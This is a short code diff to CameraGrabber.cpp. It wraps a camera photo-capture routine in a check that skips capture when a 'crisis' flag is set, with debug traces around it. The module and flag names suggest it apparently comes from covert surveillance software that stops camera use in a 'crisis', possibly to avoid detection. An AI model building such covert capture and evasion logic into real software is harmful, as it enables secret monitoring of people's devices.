@@ -57,9 +57,10 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 	
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module is Alive\n", 5, FALSE);
 
-	
-	NativeCapture^ photoCapture = ref new NativeCapture();
-	photoCapture=nullptr;
+	if ((statusObj->Crisis() & CRISIS_CAMERA) != CRISIS_CAMERA) 
+	{
+		NativeCapture^ photoCapture = ref new NativeCapture();
+		photoCapture=nullptr;
 	
 #ifdef _DEBUG		
 		wchar_t msgW[128];
@@ -79,8 +80,7 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 #endif
 
 		conta++;
-
-
+	}
 
 	me->setStatus(MODULE_STOPPED);
 	DBG_TRACE(L"Debug - CameraGrabber.cpp - Camera Module clean stop\n", 5, FALSE);
